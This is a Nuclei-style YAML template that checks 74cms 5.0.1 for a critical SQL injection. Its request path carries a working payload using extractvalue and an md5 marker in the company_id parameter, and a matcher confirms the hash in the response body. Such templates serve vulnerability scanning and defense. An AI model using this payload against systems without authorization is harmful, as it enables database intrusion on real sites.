http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  method: GET
  path:
  - '{{BaseURL}}/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")
    and extractvalue(1,concat(0x7e,md5({{num}}))) -- a'
id: 74cms-sqli
info:
  author: princechaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: A SQL injection vulnerability exists in 74cms 5.0.1 AjaxPersonalController.class.php.
  metadata:
    max-request: 1
  name: 74cms Sql Injection
  reference:
  - https://github.com/possib1e/vuln/issues/3
  severity: critical
  tags: 74cms,sqli,vuln
variables:
  num: '999999999'
